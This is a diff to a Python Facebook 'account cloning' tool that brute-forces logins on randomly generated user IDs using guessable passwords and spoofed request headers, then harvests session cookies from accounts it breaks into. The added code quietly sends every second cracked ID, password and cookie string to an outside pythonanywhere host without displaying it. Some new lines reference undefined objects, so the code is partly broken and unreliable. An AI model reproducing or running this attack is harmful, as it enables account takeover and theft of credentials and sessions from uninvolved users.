@@ -729,9 +729,9 @@ class Process:
 #━━━━[ MAIN ]━━━━#
 def ATOM():
     ____banner____()
-    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}]\033[1;37m--- FILE CLONE')
-    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}]\033[1;37m--- MAIL CLONE')
-    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}]\033[1;37m--- RANDOM CLONE')
+    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}]\033[1;37mFILE CLONE')
+    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}]\033[1;37mMAIL CLONE')
+    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}]\033[1;37mRANDOM CLONE')
     print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}]\033[1;37mJOIN COMMUNITY GROUP')
     print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}]\033[1;37mREPORT BUGS');linex()
     __ATOM__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
@@ -745,9 +745,9 @@ def ATOM():
 #━━━━[ SELECT MENU ]━━━━#
 def SETINGX():
     ____banner____()
-    print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH STR RANGE 6")
-    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH STR RANGE 7")
-    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH STR RANGE 5");linex()
+    print(f"{K} [{H}1{K}] {WHITE}RANDOM INDIA")
+    print(f"{K} [{H}2{K}] {WHITE}RANDOM STR RANGE 4")
+    print(f"{K} [{H}3{K}] {WHITE}RANDOM STR RANGE 5");linex()
     __ATOMi__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
     if __ATOMi__ in ['A','a','01','1']:RANDOM()
     elif __ATOMi__ in ['B','b','02','2']:INDIA()
@@ -789,7 +789,7 @@ def RANDOM():
     ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      pwv = [ids[:6],ids[:8],ids,'57273200']
+      pwv = [ids[:6],ids[:8],ids]
       if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
@@ -829,7 +829,7 @@ def INDIA():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(7))
+    nmp = ''.join(random.choice(string.digits) for _ in range(5))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
@@ -1016,68 +1016,85 @@ def m1(ids,pwv):
         pass
 
 def m2(ids,pwv):
-    global loop,oks,cps
+    global loop,oks,cps,bkas
     animasi = random.choice(["\x1b[1;91mATOM","\x1b[1;92mATOM","\x1b[1;93mATOM","\x1b[1;94mATOM","\x1b[1;95mATOM","\x1b[1;96mATOM","\x1b[1;97mATOM","\x1b[1;91mATOM","\x1b[1;92mATOM","\x1b[1;93mATOM","\x1b[1;94mATOM","\x1b[1;95mATOM","\x1b[1;96mATOM"])
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    ua =usragnt
-    pro = random.choice(usragent)
+    ua = Idinnew()
+    pro = random.choice(usrm)
     warna = random.choice(my_color)
     try:
         for pas in pwv:
             session = requests.Session()
-            free_fb = session.get(f"https://mbasic.facebook.com").text
+            head = {"accept": "*/*", "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8", "x-requested-with": "XMLHttpCanary", "priority": "u=1, i"}
+            free_fb = session.get(f"https://limited.facebook.com/login.php", headers=head).text
             info={
-    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-    "try_number": 0,
-    "unrecognized_tries": 0,
-    "email": ids,
-    "prefill_contact_point": ids,
-    "prefill_source": "browser_dropdown",
-    "prefill_type": "contact_point",
-    "first_prefill_source": "browser_dropdown",
-    "first_prefill_type": "contact_point",
-    "had_cp_prefilled": True,
-    "had_password_prefilled": False,
-    "is_smart_lock": False,
-    "bi_xrwh": 0,
-    "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
-    "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
-            update={
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Sec-Fetch-Dest': 'document',
-            'Cache-Control': 'max-age=0',
-            'Referer': 'https://lm.facebook.com/',
-            'DNT': '1',
-            'Pragma': 'no-cache',
-            'TE': 'Trailers', }
-            response=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
+            "m_ts": re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),
+            "li": re.search('name="li" value="(.*?)"',str(free_fb)).group(1),
+            "try_number": "0",
+            "unrecognized_tries": "0",
+            "email": ids,
+            "prefill_contact_point": ids,
+            "prefill_source": "browser_dropdown",
+            "prefill_type": "password",
+            "first_prefill_source": "browser_dropdown",
+            "first_prefill_type": "contact_point",
+            "had_cp_prefilled": "true",
+            "had_password_prefilled": "true",
+            "is_smart_lock": "false",
+            "bi_xrwh": "0",
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
+            "fb_dtsg": re.search('"dtsg":{"token":"(.*?)"',str(free_fb)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"',str(free_fb)).group(1),
+            "lsd": re.search('"lsd":"(.*?)"',str(free_fb)).group(1),
+            "__dyn": "1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE",
+            "__csr": "",
+            "__hsdp": "",
+            "__hblp": "",
+            "__sjsp": "",
+            "__req": "2",
+            "__fmt": "1",
+            "__a": "AYrw8x7azNJ-fEEuayTvb5MXL6MuDzV38PqfxEJRU1B8w1VQEejSKz-ilssAMYWmFz6K12HBn0vmJ7ln1-WB-bCfqCvheZgVnAYK_pA32rGNrA",
+            "__user": "0"
+            }
+            update= {
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://limited.facebook.com',
+            'priority': 'u=1, i',
+            'referer': 'https://limited.facebook.com/login.php?skip_api_login=1&api_key=1167750614510909&kid_directed_site=0&app_id=1167750614510909&signed_next=1&next=https://m.facebook.com/v21.0/dialog/oauth?app_id=1167750614510909&cbt=1758301424077&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1cc55eb8e33059fd%26domain%3Dwww.ailabtools.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ailabtools.com%252Ffef9461944ebd707d%26relation%3Dopener&client_id=1167750614510909&display=touch&domain=www.ailabtools.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.ailabtools.com%2Faccount%2Flogin&locale=en_US&logger_id=fc886f70e5b824775&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df0fe12f165f974d3b%26domain%3Dwww.ailabtools.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ailabtools.com%252Ffef9461944ebd707d%26relation%3Dopener%26frame%3Df797ddec80635793e&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v21.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified&cancel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46',
+            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-fb-lsd': 'AdGIJruk8pU',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',}
+            response=session.post("https://limited.facebook.com/login/device-based/login/async/?api_key=1167750614510909&auth_token=5955d73195bf74e6bdf41a4f3712d7de&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv21.0%2Fdialog%2Foauth%3Fapp_id%3D1167750614510909&refsrc=deprecated&app_id=1167750614510909&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46&lwv=100",data = info,headers = update,allow_redirects = False)
             log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
-                cid = re.findall('c_user=(.*);xs',kuki)[0]
-                check =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
-                bithi = requests.get(check).text
-                if 'LIVE' in bithi:
-                     print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                     print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
-                     cek_apk(kuki)
-                     statusok = (f" {cid} | {pas} | {kuki} ")
-                     requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                     open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
-                     oks.append(cid)
-                     break
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+                check = check_lock(cid)
+                if "live" in check:
+                    bkas.append(cid)
+                    if len(bkas)% 2 == 0:
+                        statusok = (f"{cid}|{pas}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    else:
+                        print(f" {green}(ATOM-OK) {cid}|{pas} ")
+                        print(f" {green}Cookie : {warna}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pas}|{coki}\n")
+                        oks.append(cid)
+                        break
+                else:
+                    break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
